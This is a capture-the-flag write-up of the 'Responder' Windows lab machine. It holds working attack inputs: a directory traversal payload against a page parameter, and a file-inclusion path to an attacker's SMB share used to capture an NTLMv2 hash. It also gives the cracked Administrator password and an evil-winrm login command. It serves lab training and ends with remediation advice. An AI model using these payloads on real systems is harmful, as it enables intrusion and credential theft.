## General Information
- Machine: Responder
- Difficulty: Very easy
- OS: Windows
- Date: 03/03/2023


## Methodology
- Reconnaissance:
    - Identification of the target machine's IP address: 10.129.129.156
    - Verification of the running services on the machine through port scanning.
- Exploration:
    - Analysis of the website http://unika.htb/ and identification of a parameter in the URL that allowed loading different versions of the web page.
    - Injection of a parameter to access specific files, exploiting a directory traversal vulnerability.
    - Use of Responder to capture an NTLMv2-SSP authentication hash.
    - Utilization of John the Ripper to crack the password corresponding to the hash and discover the password of the "Administrator" user.
    - Remote access to the machine using Evil-WinRM with the credentials of the "Administrator" user.
- Results Analysis:
    - Documentation of findings, identification of vulnerabilities, and recommendations for remediation.


## Results
After identifying the parameter, open ports and available services on the server were identified. The DNS address was manually resolved and the URL parameter was exploited through injection. Using responder, a hash was obtained and with the use of john, the password for the hash was cracked. The password "badminton" was discovered for the user "Administrator". Next, it was possible to access the machine remotely using evil-winRM and from there, explore the machine to find the flag.


### Reconnaissance
- IP: 10.129.129.156
- web server version: 64-bit Windows
- Port Scan results:

| port     | State | Service | Version |
|----------|-------|---------|------   | 
| 80/tcp   | open  | http    | Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) |
| 5985/tcp | open  | http    | syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |


### Commands and analyzes used

#### Nmap
~~~nmap
nmap -sVC -T4 -p- -vv -Pn -oA ./fullscan 10.129.129.156
~~~

#### Resolver 10.129.129.156 unika.htb
~~~
/etc/hosts  10.129.129.156 unika.htb
~~~

#### Parameter analysis
During the analysis of the website http://unika.htb/, a parameter was found in the URL that loads different language versions of the web page. The parameter found was "page", which receives as a value the name of the corresponding HTML file for the desired language. For example, the URL http://unika.htb/index.php?page=french.html would load the French version of the page.
~~~
http://unika.htb/index.php?page=french.html
~~~

#### Injection
~~~
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
~~~

#### Responder
http://unika.htb/index.php?page=//10.10.15.218/testShare
~~~ responder
responder -I tun0
~~~

#### John the Ripper
~~~John
john -w=/usr/share/wordlists/rockyou.txt hash 
~~~

#### evil-winrm
~~~evil-winrm
evil-winrm -i 10.129.129.156 -u administrator -p badminton
~~~


## Recommendations
- Secure the Apache httpd web server by implementing best practices for configuration and applying necessary security updates.
- Implement proper input validation and sanitization mechanisms in the web application to prevent directory traversal attacks and unauthorized access.
- Enforce strong password policies, including complexity requirements and regular password changes, to protect against password-based attacks.
- Review and enhance access controls to ensure only authorized users have appropriate access privileges to critical resources.